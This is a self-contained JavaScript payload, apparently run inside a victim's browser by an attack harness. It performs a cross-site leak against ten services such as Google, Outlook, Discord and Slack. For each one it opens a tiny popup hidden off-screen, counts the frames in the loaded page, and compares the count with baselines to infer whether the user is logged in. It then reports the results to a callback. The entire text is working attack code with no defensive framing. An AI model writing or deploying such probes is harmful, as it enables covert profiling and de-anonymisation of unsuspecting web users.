(function(){
var SITES = window.__pzOracleSites || [
  {name:'Google',      url:'https://accounts.google.com/', authed:1, unauthed:0},
  {name:'Facebook',    url:'https://www.facebook.com/',    authed:0, unauthed:0},
  {name:'Twitter/X',   url:'https://x.com/',               authed:0, unauthed:0},
  {name:'LinkedIn',    url:'https://www.linkedin.com/',    authed:0, unauthed:0},
  {name:'GitHub',      url:'https://github.com/',          authed:0, unauthed:0},
  {name:'Reddit',      url:'https://www.reddit.com/',      authed:0, unauthed:0},
  {name:'Outlook',     url:'https://outlook.live.com/',    authed:1, unauthed:0},
  {name:'Discord',     url:'https://discord.com/channels/@me', authed:1, unauthed:0},
  {name:'Slack',       url:'https://app.slack.com/',       authed:1, unauthed:0},
  {name:'Notion',      url:'https://www.notion.so/',       authed:0, unauthed:0}
];

var results=[]; var idx=0;

function probeNext(){
  if(idx>=SITES.length){ __pzResult({sites:results, summary: results.filter(function(r){return r.likely_logged_in;}).map(function(r){return r.name;}).join(', ')||'none detected'}); return; }
  var site=SITES[idx++];
  try{
    var popup=window.open(site.url,'__pzOracle'+idx,'width=1,height=1,left=-9999,top=-9999');
    if(!popup){ results.push({name:site.name,error:'popup_blocked'}); probeNext(); return; }
    var polls=0; var MAX=20; var prevLen=-1; var stableCount=0;
    var timer=setInterval(function(){
      try{
        var len=popup.length;
        // Wait for length to stabilize (page loaded) or hit max polls
        if(len===prevLen) stableCount++; else stableCount=0;
        prevLen=len;
        if(++polls>=MAX || stableCount>=3){
          clearInterval(timer);
          try{popup.close();}catch(e){}
          var likely = (site.authed !== site.unauthed)
            ? len===site.authed
            : null; // unknown baseline — report raw
          results.push({name:site.name, frames:len, likely_logged_in:likely, note: likely===null?'baseline unknown':undefined});
          probeNext();
        }
      }catch(e){ clearInterval(timer); try{popup.close();}catch(e2){} results.push({name:site.name,error:'cross_origin_blocked'}); probeNext(); }
    },250);
  }catch(e){ results.push({name:site.name,error:String(e)}); probeNext(); }
}

probeNext();
return '__async__';
})()